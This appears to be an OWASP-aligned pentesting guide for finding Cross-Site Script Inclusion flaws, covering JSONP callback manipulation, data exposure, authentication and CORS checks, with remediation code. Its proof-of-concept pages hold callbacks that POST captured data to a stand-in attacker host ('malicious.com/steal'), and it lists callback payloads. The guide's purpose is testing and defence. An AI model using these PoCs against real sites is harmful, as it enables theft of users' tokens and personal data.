# Testing for Cross-Site Script Inclusion (XSSI) Vulnerabilities

## Overview

Testing for Cross-Site Script Inclusion (XSSI) vulnerabilities involves verifying that a web application prevents attackers from including its scripts across origins to steal sensitive data. According to OWASP (WSTG-CLNT-13), XSSI vulnerabilities occur when JavaScript or JSONP endpoints expose sensitive data (e.g., user information, tokens) without proper access controls, allowing malicious sites to include these scripts and extract data. This guide provides a hands-on methodology to identify and test XSSI vulnerabilities, focusing on insecure script inclusion, JSONP callback manipulation, sensitive data exposure, and lack of authentication, with tools, commands, and remediation strategies.

**Impact**: XSSI vulnerabilities can lead to:
- Theft of sensitive data (e.g., authentication tokens, user profiles).
- Session hijacking or unauthorized access to user accounts.
- Data leakage to malicious websites via cross-origin script inclusion.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-CLNT-13, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as including target scripts in malicious pages may trigger security alerts or violate terms of service.

## Testing Tools

The following tools are recommended for testing XSSI vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts HTTP requests and analyzes script or JSONP responses.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to modify requests (e.g., JSONP callbacks).
  - **Note**: Check Response tab for sensitive data in scripts.

- **Zed Attack Proxy (ZAP) 3.0**: A proxy tool for intercepting requests and scanning for XSSI issues.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:11000`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with “Client-side XSSI” rules to detect exposed data.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects script responses and network requests.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to identify JavaScript/JSONP endpoints and Sources tab to analyze scripts.
  - Example command to test script inclusion:
    ```javascript
    const script = document.createElement('script');
    script.src = 'http://example.com/data.js';
    document.body.appendChild(script);
    ```
  - **Tip**: Firefox’s 2025 Network tab enhancements improve script response analysis.

- **cURL and HTTPie**: Send HTTP requests to test script or JSONP endpoints.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/data.js?callback=malicious"
      # HTTPie
      http "http://example.com/data.js?callback=malicious"
      ```

- **XSSI Tester**: A custom script or manual PoC for testing script inclusion.
  - Example PoC (see Testing Methodology).
  - **Note**: Host PoCs on a controlled server for ethical testing.

- **XSSI Payloads**: Curated payloads for testing.
  - Sample payloads:
    - `callback=alert`
    - `callback=maliciousFunction`
    - `//malicious.com/steal`
  - Resource: [OWASP XSSI Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Script_Inclusion_Cheat_Sheet.html).
  - **Tip**: Test payloads in JSONP callbacks or script URLs and monitor data leakage.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-CLNT-13, testing XSSI vulnerabilities across script inclusion, JSONP endpoints, sensitive data exposure, authentication, and cross-origin access.

### 1. Test Script Inclusion

**Objective**: Ensure JavaScript files do not expose sensitive data when included cross-origin.

**Steps**:
1. Identify JavaScript endpoints:
   - Use Network tab to find `.js` files or JSONP responses.
   - Search for `<script src>` in HTML.
2. Create a malicious page to include the script:
   ```html
   <!DOCTYPE html>
   <html>
   <body>
     <script>
       function stealData(data) {
         fetch('http://malicious.com/steal', { method: 'POST', body: JSON.stringify(data) });
       }
     </script>
     <script src="http://example.com/data.js"></script>
   </body>
   </html>
   ```
3. Host the page (e.g., `python3 -m http.server 8000`) and load it.
4. Check for data leakage:
   - Monitor `malicious.com` logs for sensitive data (e.g., tokens).

**Example Secure Response**:
```javascript
// No sensitive data exposed
var data = {};
```
No data stolen.

**Example Vulnerable Response**:
```javascript
// Sensitive data exposed
var user = { token: 'abc123', email: 'user@example.com' };
```
Data sent to `malicious.com`.

**Remediation**:
- Avoid sensitive data in scripts:
  ```javascript
  // Use API calls instead
  fetch('/api/data').then(res => res.json());
  ```
- Add authentication checks:
  ```javascript
  if (!authenticated) return '';
  ```

**Tip**: Save PoC code and stolen data logs in a report.

### 2. Test JSONP Callback Manipulation

**Objective**: Ensure JSONP endpoints do not allow arbitrary callback functions.

**Steps**:
1. Identify JSONP endpoints:
   - Look for URLs with `?callback=` or `?jsonp=` parameters.
2. Test with a malicious callback:
   ```bash
   http "http://example.com/data?callback=alert"
   ```
3. Check response:
   - Verify if the response wraps sensitive data in the callback (e.g., `alert({token:'abc123'})`).
4. Create a PoC:
   ```html
   <script>
     function malicious(data) {
       fetch('http://malicious.com/steal', { method: 'POST', body: JSON.stringify(data) });
     }
   </script>
   <script src="http://example.com/data?callback=malicious"></script>
   ```

**Example Secure Response**:
```http
HTTP/1.1 403 Forbidden
```
Callback rejected or sanitized.

**Example Vulnerable Response**:
```javascript
malicious({"token":"abc123"})
```
Data sent to `malicious.com`.

**Remediation**:
- Validate callbacks:
  ```javascript
  if (/^[a-zA-Z0-9]+$/.test(callback)) {
    res.send(`${callback}(${JSON.stringify(data)})`);
  }
  ```
- Avoid JSONP; use CORS:
  ```javascript
  res.set('Access-Control-Allow-Origin', 'https://example.com');
  ```

**Tip**: Save JSONP responses and PoC logs in a report.

### 3. Test Sensitive Data Exposure

**Objective**: Ensure scripts or JSONP endpoints do not expose sensitive data.

**Steps**:
1. Request script/JSONP endpoints:
   ```bash
   curl -i http://example.com/data.js
   ```
2. Check for sensitive data:
   - Look for tokens, PII, or credentials in responses.
3. Test cross-origin inclusion:
   - Use the PoC from Step 1 to include the script and check for data leakage.

**Example Secure Response**:
```javascript
// No sensitive data
var config = { theme: 'dark' };
```
No sensitive data exposed.

**Example Vulnerable Response**:
```javascript
// Sensitive data exposed
var user = { id: 123, email: 'user@example.com' };
```
Data accessible cross-origin.

**Remediation**:
- Remove sensitive data:
  ```javascript
  // Serve only necessary data
  var data = { public: 'value' };
  ```
- Use server-side validation:
  ```javascript
  if (!req.session.authenticated) return {};
  ```

**Tip**: Save response contents and data leakage logs in a report.

### 4. Test Authentication Requirements

**Objective**: Ensure script/JSONP endpoints require authentication.

**Steps**:
1. Access endpoints without credentials:
   ```bash
   curl -i http://example.com/data.js
   ```
2. Check response:
   - Verify if sensitive data is returned without authentication.
3. Test with invalid credentials:
   - Use Burp Suite to modify cookies and retry:
     ```bash
     curl -i -H "Cookie: session=invalid" http://example.com/data.js
     ```

**Example Secure Response**:
```http
HTTP/1.1 401 Unauthorized
```
No data returned without authentication.

**Example Vulnerable Response**:
```javascript
var user = { token: 'abc123' };
```
Data returned without authentication.

**Remediation**:
- Require authentication:
  ```javascript
  if (!req.session.user) {
    res.status(401).send('Unauthorized');
  }
  ```
- Use secure cookies:
  ```javascript
  res.cookie('session', token, { httpOnly: true, secure: true });
  ```

**Tip**: Save authentication test results and response data in a report.

### 5. Test Cross-Origin Access Controls

**Objective**: Ensure scripts are protected against unauthorized cross-origin access.

**Steps**:
1. Check for CORS headers:
   ```bash
   http --headers http://example.com/data.js
   ```
2. Look for permissive `Access-Control-Allow-Origin`:
   - Vulnerable if `*` or untrusted origins are allowed.
3. Test with a cross-origin request:
   ```javascript
   fetch('http://example.com/data.js', { headers: { Origin: 'http://malicious.com' } })
     .then(res => res.text())
     .then(data => console.log(data));
   ```
4. Verify if sensitive data is accessible.

**Example Secure Response**:
```http
HTTP/1.1 403 Forbidden
```
No cross-origin access.

**Example Vulnerable Response**:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
Data accessible to `malicious.com`.

**Remediation**:
- Restrict CORS:
  ```javascript
  res.set('Access-Control-Allow-Origin', 'https://example.com');
  ```
- Disable CORS for scripts:
  ```javascript
  res.removeHeader('Access-Control-Allow-Origin');
  ```

**Tip**: Save CORS headers and cross-origin response data in a report.
